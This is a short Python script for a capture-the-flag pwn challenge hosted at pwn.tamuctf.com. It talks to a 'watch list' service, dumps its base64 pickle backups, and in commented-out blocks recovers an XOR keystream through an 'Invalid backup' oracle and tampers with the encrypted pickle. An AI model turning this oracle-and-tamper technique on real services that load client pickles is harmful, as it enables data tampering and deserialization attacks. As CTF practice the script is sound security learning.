from ptrlib import *
import pickletools
import base64

def add_list(num):
    sock.recvuntil("watch list")
    sock.sendline("1")
    sock.recvuntil("list:")
    sock.sendline(str(num))
    
def backup_list():
    sock.recvuntil("watch list")
    sock.sendline("3")
    sock.recvuntil("(Don't lose it!):")
    b64 = sock.recvline()
    return base64.b64decode(b64.rstrip())

def load_list(data):
    sock.recvuntil("watch list")
    sock.sendline("4")
    sock.recvuntil(":")
    sock.sendline(base64.b64encode(data))
    if b"Invalid backup" in sock.recvline():
        return False
    else:
        return True

sock = Socket("pwn.tamuctf.com", 8448)

data = backup_list()
pickletools.dis(data)
print(data.hex())
add_list(44)
data = backup_list()
print(data.hex())
add_list(42)
data = backup_list()
print(data.hex())
    
"""
add_list(44)
data = backup_list()

key = b'\x01\xf4b\xfe\t0\x97\x1a\x9c\x12&U1!X #,\x102\x06\xfe\x07\x9d\xb1\xed\x13\xb2!\xa3\xb2\x1fX\x13%\xa3n4\x9c\x12%'

offset = data.index(b"\x33\x4d\x35") + 3

for i in range(len("44. Veggies in Space: The Fennel Frontier")):
    data = data[:offset + i] + bytes([data[offset + i] ^ key[i]]) + data[offset + i + 1:]

print(data)
"""

"""
key = b""
for i in range(len("44. Veggies in Space: The Fennel Frontier")):
    ofs = offset + i
    d = data[ofs]
    for c in [0, 13, 128] + list(range(0x100)):
        if c == d:
            continue
        data = data[:ofs] + bytes([c]) + data[ofs + 1:]
        if load_list(data):
            dump("OK")
            key += bytes([c ^ d])
            break
    else:
        print("NG!")
        print(key)
        break
print(key)
"""
